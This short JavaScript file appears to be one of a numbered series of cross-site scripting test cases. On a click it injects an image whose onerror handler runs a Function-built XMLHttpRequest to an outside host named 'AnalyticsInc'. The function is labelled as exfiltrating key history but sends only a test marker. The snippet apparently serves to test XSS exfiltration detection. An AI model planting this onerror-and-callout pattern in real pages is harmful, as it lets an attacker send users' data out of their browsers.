function exfiltrate_key_history() {

    // XSS 10 - IMG ONERROR - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL=Function('xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss10",true);xmlhttp.send(null);');
    var script = document.createElement("img");
    script.src = '/';
    script.onerror = URL;
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;